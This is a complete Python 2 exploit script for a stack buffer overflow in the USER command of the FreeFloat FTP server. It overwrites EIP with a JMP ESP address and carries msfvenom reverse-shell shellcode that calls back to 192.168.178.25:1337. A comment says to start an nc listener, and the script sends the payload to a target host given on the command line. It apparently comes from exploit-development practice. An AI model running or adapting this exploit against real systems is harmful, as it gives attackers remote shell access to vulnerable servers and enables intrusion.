# 
# FreeFloatFTP USER command stack based BoF Exploit:
#

import sys, socket
import struct, sys, time
from time import sleep
 
# set first argument given at CLI to 'target' variable
target = sys.argv[1]

# Padding:
payload = "A"*230

# JMP ESP : shell32.dll
payload += struct.pack("<I", 0x7cb32d69)

# EIP overwriting:
#~ payload += struct.pack("<I",0xb00b4dad)

# Padding for stack alignment:
payload += "\x90"*13

# badchar identification (stage1: full char list):
#~ payload  += ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
#~ "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
#~ "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
#~ "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
#~ "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
#~ "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
#~ "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
#~ "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

# msfvenom  -p windows/shell_reverse_tcp LPORT=1337 LHOST=192.168.178.25 -b "\x00\x0a" -f c
# 	-> prepare your nc -vv -l p 1337 listener
payload +=("\xbd\x33\xe6\x0e\x05\xd9\xc5\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x52\x83\xc6\x04\x31\x6e\x0e\x03\x5d\xe8\xec\xf0\x5d\x1c\x72"
"\xfa\x9d\xdd\x13\x72\x78\xec\x13\xe0\x09\x5f\xa4\x62\x5f\x6c"
"\x4f\x26\x4b\xe7\x3d\xef\x7c\x40\x8b\xc9\xb3\x51\xa0\x2a\xd2"
"\xd1\xbb\x7e\x34\xeb\x73\x73\x35\x2c\x69\x7e\x67\xe5\xe5\x2d"
"\x97\x82\xb0\xed\x1c\xd8\x55\x76\xc1\xa9\x54\x57\x54\xa1\x0e"
"\x77\x57\x66\x3b\x3e\x4f\x6b\x06\x88\xe4\x5f\xfc\x0b\x2c\xae"
"\xfd\xa0\x11\x1e\x0c\xb8\x56\x99\xef\xcf\xae\xd9\x92\xd7\x75"
"\xa3\x48\x5d\x6d\x03\x1a\xc5\x49\xb5\xcf\x90\x1a\xb9\xa4\xd7"
"\x44\xde\x3b\x3b\xff\xda\xb0\xba\x2f\x6b\x82\x98\xeb\x37\x50"
"\x80\xaa\x9d\x37\xbd\xac\x7d\xe7\x1b\xa7\x90\xfc\x11\xea\xfc"
"\x31\x18\x14\xfd\x5d\x2b\x67\xcf\xc2\x87\xef\x63\x8a\x01\xe8"
"\x84\xa1\xf6\x66\x7b\x4a\x07\xaf\xb8\x1e\x57\xc7\x69\x1f\x3c"
"\x17\x95\xca\x93\x47\x39\xa5\x53\x37\xf9\x15\x3c\x5d\xf6\x4a"
"\x5c\x5e\xdc\xe2\xf7\xa5\xb7\xcc\xa0\x17\x5e\xa5\xb2\x57\x64"
"\x0c\x3a\xb1\x0c\x7e\x6a\x6a\xb9\xe7\x37\xe0\x58\xe7\xed\x8d"
"\x5b\x63\x02\x72\x15\x84\x6f\x60\xc2\x64\x3a\xda\x45\x7a\x90"
"\x72\x09\xe9\x7f\x82\x44\x12\x28\xd5\x01\xe4\x21\xb3\xbf\x5f"
"\x98\xa1\x3d\x39\xe3\x61\x9a\xfa\xea\x68\x6f\x46\xc9\x7a\xa9"
"\x47\x55\x2e\x65\x1e\x03\x98\xc3\xc8\xe5\x72\x9a\xa7\xaf\x12"
"\x5b\x84\x6f\x64\x64\xc1\x19\x88\xd5\xbc\x5f\xb7\xda\x28\x68"
"\xc0\x06\xc9\x97\x1b\x83\xf9\xdd\x01\xa2\x91\xbb\xd0\xf6\xff"
"\x3b\x0f\x34\x06\xb8\xa5\xc5\xfd\xa0\xcc\xc0\xba\x66\x3d\xb9"
"\xd3\x02\x41\x6e\xd3\x06")

 
# FTP connection:
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.settimeout(2)
s.connect((target,21))
s.recv(1024)

print "Sending buffer with length: "+str(len(payload))
# Perform authenticaton on FTP service:
s.send('USER ftp\r\n')
s.recv(1024)
s.send('PASS ftp\r\n')
s.recv(1024)

# Send payload, enjoy your shell:
s.send("USER "+payload+"\r\n")
s.close()
sleep(1)


